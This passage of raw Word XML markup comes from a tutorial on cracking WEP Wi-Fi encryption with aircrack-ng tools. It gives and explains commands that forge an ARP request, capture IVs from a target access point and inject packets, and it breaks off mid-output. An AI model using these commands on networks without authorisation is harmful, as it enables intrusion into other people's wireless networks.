        <w:t xml:space="preserve"> -0 -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 -k 255.255.255.255 -l 255.255.255.255 -y fragment-0203-180343.xor -w </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296DD61C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75BBA9A4"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3B67DEA2" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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-0 means generate an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD4AF9E" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C61EDCD" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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00:09:5B:EC:EE:F2 is MAC address of our card</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03ECD487" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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k</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 255.255.255.255 is the destination IP (most APs respond to 255.255.255.255)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA1E6AE" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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l</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 255.255.255.255 is the source IP (most APs respond to 255.255.255.255)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="711B7E6B" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> fragment-0203-180343.xor is file to read the PRGA from (NOTE: Change the file name to the actual file name out in step 4 above)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46CDCD93" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1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w</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">-request is name of file to write the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6054603C"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The system will respond:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FFCC3DA" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EF244CF"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Pr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Wrote packet to: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>-request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F467F08" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E843AD5" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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5 - Start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="31D1F0FF"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Open another console session to capture the generated IVs. Then enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E17249A" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38E40A1A" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008E353E" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -c 9 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 -w capture wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F645F57" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68AA428D"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66C81308" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>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c</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 9 is the channel for the wireless network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248F04C2" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>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spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>This eliminate</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> extraneous traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB63AB4" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>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w</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> capture is file name prefix for the file which will contain the captured packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F6D604" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="001F4FDF" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>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Pr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the interface name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027D545D" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D1A1F79" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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6 - Inject the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E361478"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Using the console session where you generated the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet, enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BBBE9DA" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03073B1F" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008E353E" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -2 -r </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-request wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4773CF74" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="003112DC" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40EA8204"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7F8A9B02" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>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-2 means use interactive frame selection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0369877A" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>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r</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">-request defines the file name from which to read the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="027F0E98" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>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Pr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> defines the interface to use</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F5F8454"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The system will respond:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6483AD"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Size: 68, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>FromDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: 0, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ToDS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: 1 (WEP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211C69AD"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0EE5FE"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BSSID  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=  00:14:6C:7E:40:80</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="089A1A71"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Dest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">. MAC  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
